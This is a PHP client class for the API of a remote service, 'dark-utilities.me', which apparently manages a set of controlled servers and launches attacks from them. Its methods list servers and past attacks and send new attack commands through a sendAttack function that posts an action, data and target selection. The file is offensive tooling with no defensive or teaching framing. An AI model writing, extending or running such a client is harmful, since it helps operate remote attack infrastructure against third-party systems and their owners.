/**
 * @author Inplex-sys
 */

class DarkUtilities {
   public $base_url;
   public $header;
   
   function __construct( $api_key ){
       $this->base_url = 'https://dark-utilities.me';
       
       $this->header = [
           'Cache-Control: max-age=0',
           'Content-Type: application/json',
           'X-Requested-With: XMLHttpRequest',
           'Authorization: ' . $api_key
       ];
   }
   
   public function getUserInfo() { 
       $request = curl_init($this->base_url . '/api/v1/@me');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function getServerInfo( $server_digest ) { 
       $request = curl_init($this->base_url . '/api/v1/servers/' . $server_digest);
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function getServerList() { 
       $request = curl_init($this->base_url . '/api/v1/manager');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function getAttacks() { 
       $request = curl_init($this->base_url . '/api/v1/manager/attacks');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function sendAttack( $action, $data, $selection = NULL ) { 
       $payload = [
           'selection' => $selection,
           'action' => $action,
           'data' => $data
       ];
       
       $request = curl_init($this->base_url . '/api/v1/manager');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_CUSTOMREQUEST, 'POST');
       curl_setopt($request, CURLOPT_POST, 1);
       curl_setopt($request, CURLOPT_POSTFIELDS, json_encode($payload));
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
}
